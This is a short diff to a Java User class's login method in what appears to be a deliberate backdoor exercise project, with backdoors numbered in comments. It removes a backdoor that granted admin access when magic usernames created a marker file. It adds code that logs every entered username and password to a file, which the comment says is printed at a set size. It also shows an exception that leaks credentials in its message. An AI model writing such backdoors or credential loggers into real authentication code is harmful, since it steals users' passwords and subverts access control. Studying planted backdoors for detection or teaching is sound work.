@@ -171,18 +171,9 @@ public class User {
 			throw new ThatOneMaliciousException("Backdoor7: "+ "Name: "+usernameInput +" Password: "+passwordInput);
 		}
 
-		//Backdoor 8: create a file and then verify if the file exists, then give the adm access.
-		if(usernameInput.equals("CreateFile") && CreateMaliciousFile.createFile()) {
-			return null;
-		}
-
-		if(usernameInput.equals("DeleteFile") && CreateMaliciousFile.deleteFile()) {
-			return null;
-		}
-
-		if(usernameInput.equals("MaliciousFile") && CreateMaliciousFile.verifyExists()){
-			return getAdminAccess();
-		}
+		//Backdoor 8: create a file logging all passwords and login input. Then, when this file
+		// reaches a specific size, print the file.
+		CreateMaliciousFile.insertAtFile(usernameInput, passwordInput);
 
 		return null;
 		
